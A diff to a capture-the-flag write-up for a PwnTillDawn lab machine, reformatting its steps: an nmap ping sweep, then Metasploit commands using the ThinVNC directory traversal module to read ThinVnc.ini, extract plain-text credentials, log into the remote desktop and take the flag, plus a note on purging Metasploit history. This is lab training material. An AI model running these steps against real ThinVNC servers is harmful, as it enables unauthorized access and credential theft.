@@ -12,13 +12,17 @@ Initial intelligence gathering on the PwnTillDawn platform identified the target
 ## 2. Scanning
 To map the attack surface, the scanning phase was divided into broad host discovery and targeted service enumeration.
 
-Host Discovery: First, a ping sweep was executed across the subnet to identify live hosts without aggressively scanning ports.
+**Host Discovery** : First, a ping sweep was executed across the subnet to identify live hosts without aggressively scanning ports.
 
-* Command: nmap -sn 10.150.150.0/24
+**Command** : 
 
-* Result: This confirmed the presence of active machines on the network and verified our specific target, 10.150.150.69, was reachable.
+```bash
+nmap -sn 10.150.150.0/24
+```
 
-Service Enumeration: Once the target was confirmed, a comprehensive port scan was executed to identify running services and potential entry points.
+* **Result** : This confirmed the presence of active machines on the network and verified our specific target, 10.150.150.69, was reachable.
+
+**Service Enumeration** : Once the target was confirmed, a comprehensive port scan was executed to identify running services and potential entry points.
 
 **Command** :
 
@@ -44,12 +48,51 @@ The scan completed in 762.16 seconds and discovered multiple open TCP ports :
 With the ThinVNC service identified on port 60000, the Metasploit Framework was utilized to search for and exploit known vulnerabilities associated with this software.
 
 **Exploitation Steps** :
-  1. Searched for ThinVNC modules: `search ThinVNC`
-  2. Selected the directory traversal vulnerability module: use 0 (which corresponds to auxiliary/scanner/http/thinvnc_traversal).
-  3. Configured the target parameters:
-     * set RHOST 10.150.150.69
-     * set RPORT 60000
-  4.  Executed the attack: `exploit`
+
+* Initiated the Metasploit console from the Kali Linux terminal using the command :
+
+  ```bash
+  msfconsole
+  ```
+* Searched for applicable modules with the command 
+
+  ```bash
+  search ThinVNC
+  ```
+
+* Selected the `auxiliary/scanner/http/thinvnc_traversal` module by entering :
+
+  ```bash
+  use 0
+  ```
+
+* Reviewed the default module parameters using :
+
+  ```bash
+  show options
+  ```
+
+* Configured the target parameters:
+
+  ```bash
+  set RHOST 10.150.150.69
+  ```
+
+  ```bash
+  set RPORT 60000
+  ```
+
+* Verified the updated parameters by running :
+
+  ```bash
+  show options
+  ```
+
+* Executed the attack against the target using the command :
+
+  ```bash
+  exploit
+  ```
 
 **Exploit Results** : The path traversal attack successfully read the `ThinVnc.ini` file and extracted plain-text credentials.
   *  Extracted Username: `desperado`
@@ -60,27 +103,8 @@ With the ThinVNC service identified on port 60000, the Metasploit Framework was 
   2. Authenticated using the extracted credentials for the user `desperado`.
   3. Accessed the ThinVNC remote desktop interface .
   4. Navigated the remote Windows desktop to locate the target file and extracted the flag hash: `257121d50fa290b1337eadeef9ba255a61633562`.
-  5. The flag was successfully submitted on the PwnTillDawn platform to compromise the box.
-
-
-
-
-
-
-
-* Launched Metasploit framework using `msfconsole`.
-* Searched for ThinVNC exploits: `search ThinVNC`.
-* Selected the directory traversal module: `use auxiliary/scanner/http/thinvnc_traversal`.
-* Configured the module options:
-  * `set RHOST 10.150.150.69`
-  * `set RPORT 60000`
-* Executed the exploit: `exploit`.
-* The exploit successfully extracted credentials from the `ThinVnc.ini` file.
-  * Username: `desperado`
-  * Password: `TooComplicatedToGuessMeAhahahahahahahh`
-* Navigated to the web interface at `http://10.150.150.69:60000` and authenticated with the discovered credentials.
-* Gained full remote desktop access via the ThinVNC web portal.
-* Located the target flag (`FLAG67`) on the system and successfully submitted it to the PwnTillDawn dashboard.
+  5. Submitted the hash on the PwnTillDawn platform for FLAG67
+  6. The platform confirmed the machine was successfully compromised by Dannyz on 17 March 2026.
 
 ##  6. Clear Tracks
 To adhere to post-exploitation best practices and clean up the local attacker environment, the operational history within the Metasploit Framework was purged.
